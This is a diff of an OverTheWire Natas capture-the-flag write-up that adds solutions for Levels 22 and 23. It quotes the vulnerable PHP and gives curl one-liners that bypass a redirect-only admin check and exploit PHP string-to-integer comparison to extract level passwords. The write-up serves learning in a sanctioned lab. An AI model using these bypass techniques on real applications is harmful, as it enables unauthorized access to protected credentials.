@@ -39,16 +39,6 @@ URL:      http://natas0.natas.labs.overthewire.org
 - [Level 21](#level-21)
 - [Level 22](#level-22)
 - [Level 23](#level-23)
-- [Level 24](#level-24)
-- [Level 25](#level-25)
-- [Level 26](#level-26)
-- [Level 27](#level-27)
-- [Level 28](#level-28)
-- [Level 29](#level-29)
-- [Level 30](#level-30)
-- [Level 31](#level-31)
-- [Level 32](#level-32)
-- [Level 33](#level-33)
 
 </details>
 
@@ -1357,4 +1347,81 @@ We can see that if `submit` is a parameter, it will just set every key/value pai
 
 ```bash
 curl -s "http://natas21:$natas21_pass@natas21.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -I -s "http://natas21:$natas21_pass@natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&submit" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas21_pass//g" | egrep -o [[:alnum:]]{32}
+```
+
+## Level 22
+
+![natas22_index.jpg](screenshots/natas/natas22_index.jpg)
+
+[Sourcecode](http://natas22.natas.labs.overthewire.org/index-source.html):
+
+```php
+?
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+...
+<?
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+```
+
+This is an extremely easy challenge. It will reveal the password as long as we have the parameter `revelio` in a GET request. However, if we look at the snippet at the top, if the `revelio` parameter exists, it will redirect us back to the home page. Luckily for us, `curl` doesn't follow redirects by default so we don't have to do anything special to solve this.
+
+```bash
+curl -s "http://natas22:$natas22_pass@natas22.natas.labs.overthewire.org/index.php?revelio" | sed "s/$natas22_pass//g" | egrep -o [[:alnum:]]{32}
+```
+
+## Level 23
+
+![natas23_index.jpg](screenshots/natas/natas23_index.jpg)
+
+[Sourcecode](http://natas23.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>
+```
+
+For this challenge, we have to pass this check to get the password:
+
+```php
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+```
+
+We have to find a way to send a password that equals `iloveyou` but has a value greater than 10. If we look at the documentation for the [strstr](https://www.php.net/manual/en/function.strstr.php) function, we see that it searches a string for the first occurrence of a string. The return value of this function is everything matching the second parameter, `iloveyou` in our case, to the end of the string. This means we can add whatever we want to the beginning of the password and it will be parsed out.
+
+Now, we just need to figure out how to get our input to be greater than 10. If we look at the documentation for [operator comparison](https://www.php.net/manual/en/language.operators.comparison.php), we see this:
+
+> If both operands are numeric strings, or one operand is a number and the other one is a numeric string, then the comparison is done numerically.
+
+> | Type of Operand 1 | Type of Operand 2 | Result
+> |-|-|-|
+> |...|...|...|
+> | string, resource, int or float | string, resource, int or float | Translate strings and resources to numbers, usual math |
+
+That's... cool. Apparently when php compares a string to integer, it will convert the string to an integer first. Conveniently enough, when you typecast a string to an integer, it parses from left to right and stops at the first non-digit character. All we have to do is prepend an integer that's greater than 10 to `iloveyou`.
+
+```bash
+curl -s "http://natas23:$natas23_pass@natas23.natas.labs.overthewire.org/index.php?passwd=11iloveyou" | sed "s/$natas23_pass//g" | egrep -o [[:alnum:]]{32}
 ```
